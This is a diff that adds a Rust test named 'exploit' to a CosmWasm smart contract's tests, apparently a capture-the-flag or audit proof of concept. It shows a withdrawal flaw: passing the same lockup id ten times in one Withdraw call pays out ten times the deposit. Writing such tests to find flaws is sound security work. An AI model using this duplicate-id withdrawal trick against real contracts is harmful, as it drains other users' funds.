@@ -105,4 +105,33 @@ pub mod tests {
         let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
         assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
     }
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        let sender = Addr::unchecked(USER);
+
+        // test query
+        let msg = QueryMsg::GetLockup { id: 1 };
+        let lockup: Lockup = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
+        assert_eq!(lockup.owner, sender);
+
+        // fast forward 24 hrs
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(LOCK_PERIOD);
+        });
+
+        // test withdraw
+        let msg = ExecuteMsg::Withdraw { ids: vec![1,1,1,1,1,1,1,1,1,1] };
+        app.execute_contract(sender, contract_addr, &msg, &[])
+            .unwrap();
+
+        // verify funds received
+        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
+        assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10));
+    }
 }
